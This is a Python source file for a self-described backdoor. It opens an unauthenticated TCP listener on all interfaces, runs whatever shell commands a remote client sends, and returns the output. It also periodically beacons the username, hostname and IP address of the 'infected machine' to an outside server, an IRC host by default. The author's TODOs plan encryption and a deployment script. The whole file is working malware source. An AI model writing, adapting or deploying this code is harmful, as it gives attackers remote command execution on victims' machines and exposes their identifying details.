#!/usr/bin/env python

# Author:   Alexandre Tea <alexandre.qtea@gmail.com>
# File:     /Users/alexandretea/Work/backdoor/backdoor.py
# Purpose:  Single-script backdoor implementation
# Created:  2016-08-09 21:32:41
# Modified: 2016-08-09 22:23:28

import sys
import socket
import argparse
import subprocess
import logging
import getpass
from threading import Thread

# TODO ping remote type (irc)
# TODO write proper readme
# TODO write disclaimer, "this is an exercice, not responsible for blabla"
# TODO encrypt communications
# TODO is cross-platform ?
# TODO deployment script

__doc__ = """ A single-script backdoor who allows remote connections to execute
shell commands. The backdoor will ping a remote server every TIMEOUT seconds,
sending him the username, the host, and -most importantly- the IP address of
the infected machine.
"""


class Client:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        self.socket.connect((self.host, self.port))

    def disconnect(self):
        self.socket.close()

    def send(self, msg):
        self.socket.send(msg)

    def get_ip_address(self):
        return self.socket.getsockname()[0]


class Server(object):

    LOGGING_DFT_FORMAT = "(%(asctime)s %(levelname)s) %(message)s"
    LOGGING_LEVELS = {
        "critical": logging.CRITICAL,
        "error":    logging.ERROR,
        "warning":  logging.WARNING,
        "info":     logging.INFO,
        "debug":    logging.DEBUG
    }

    def __init__(self, port=4242, backlog=5, log_level="info",
                 log_format=LOGGING_DFT_FORMAT,
                 timeout=5, **kwargs):
        logging.basicConfig(level=Server.LOGGING_LEVELS[log_level],
                            format=log_format)
        self.servsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.servsocket.settimeout(timeout)
        self.servsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.servsocket.bind(("", port))  # bind on all interfaces
        self.servsocket.listen(backlog)
        self.should_stop = True
        self.threads = []

    def run(self):
        self.should_stop = False

        while not self.should_stop:
            try:
                clientsocket, clientaddress = self.servsocket.accept()
                self.threads.append(Thread(target=self.handle_client,
                                           args=(clientsocket, clientaddress)))
                self.threads[-1].start()
            except socket.timeout:
                self.handle_timeout()

        for thread in self.threads:
            thread.join()

    def handle_client(self, socket, address):
        socket.settimeout(None)  # remove timeout inherited from the servsocket

    def handle_timeout(self):
        pass


class Backdoor(Server):
    def __init__(self, ping=True, ping_host=None, ping_port=None, **kwargs):
        super(Backdoor, self).__init__(**kwargs)
        self.should_ping = ping
        self.ping_host = ping_host
        self.ping_port = ping_port
        if self.should_ping:
            self.init_ping_connection()

    def handle_client(self, socket, address):
        super(Backdoor, self).handle_client(socket, address)
        f = socket.makefile()

        while not self.should_stop:
            line = f.readline()
            if len(line) == 0:
                break
            elif line[-1] == '\n':
                if len(line) == 1:
                    continue
                line = line[:-1]

            try:
                out = subprocess.check_output(line.split(" "))
                socket.send(out)
            except Exception as e:
                socket.send(str(e))

        socket.close()
        logging.info("Connection with {}:{} closed"
                     .format(address[0], address[1]))

    def handle_timeout(self):
        if self.should_ping:
            if self.ping_client is None:
                self.init_ping_connection()
            if self.ping_client is not None:
                try:
                    self.ping_client.send("{}@{}({})"
                                          .format(self.username, self.hostname,
                                                  self.ping_client
                                                  .get_ip_address()))
                except Exception as e:
                    self.ping_client.disconnect()
                    self.ping_client = None
                    logging.error("Can't ping remote server ({}:{}): {}"
                                  .format(self.ping_host, self.ping_host,
                                          str(e)))

    def init_ping_connection(self):
        self.ping_client = None
        if self.ping_host is None or self.ping_port is None:
            logging.warning("Can't ping remote server, host/port is not set")
        else:
            try:
                self.ping_client = Client(self.ping_host, self.ping_port)
                self.ping_client.connect()
                logging.info("Connected to remote ping server ({}:{})"
                            .format(self.ping_host, self.ping_port))
                self.username = getpass.getuser()
                self.hostname = socket.gethostname()
            except Exception as e:
                logging.warning("Can't connect to ping server ({}:{}): {}"
                                .format(self.ping_host, self.ping_port,
                                        str(e)))
                self.ping_client = None


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-p", "--port", type=int, action="store", default=4242,
                        help="listening port")
    parser.add_argument("--backlog", type=int, action="store", default=5,
                        help="max simultaneous clients")
    parser.add_argument("--timeout", type=int, action="store", default=5,
                        help="accepting timeout in seconds")
    parser.add_argument("--log", action="store", choices=Server.LOGGING_LEVELS,
                        default="info", help="log level")
    parser.add_argument("--no-ping", action="store_false", dest="ping",
                        default=True, help="disable ping")
    parser.add_argument("--ping-host", type=str, action="store",
                        default="irc.freenode.net",
                        help="hostname of the server to ping")
    parser.add_argument("--ping-port", type=int, action="store",
                        default=6667,
                        help="port of the server to ping")
    args = parser.parse_args(sys.argv[1:])

    backdoor = Backdoor(**vars(args))
    backdoor.run()


if __name__ == "__main__":
    main()
